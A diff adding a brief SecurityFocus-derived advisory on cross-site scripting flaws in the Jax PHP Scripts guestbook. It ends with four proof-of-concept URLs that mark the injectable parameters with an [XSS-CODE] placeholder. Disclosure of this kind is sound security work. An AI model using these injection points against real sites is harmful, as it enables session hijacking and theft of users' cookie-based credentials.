@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/14481/info
+    
+Jax PHP Scripts are affected by multiple cross-site scripting vulnerabilities. These issues are due to a failure in the applications to properly sanitize user-supplied input.
+    
+An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/guestbook/jax_guestbook.php?page=2&language=english&guestbook_id=0&gmt_ofs=0[XSS-CODE]
+http://www.example.com/guestbook/jax_guestbook.php?page=2&language=english[XSS-CODE]&guestbook_id=0&gmt_ofs=0
+http://www.example.com/guestbook/jax_guestbook.php?page=2[XSS-CODE]&language=english&guestbook_id=0&gmt_ofs=0
+http://www.example.com/guestbook/jax_guestbook.php?mailto=9aa43a5efc2585681c97993d777bcd41&language=english[XSS-CODE]
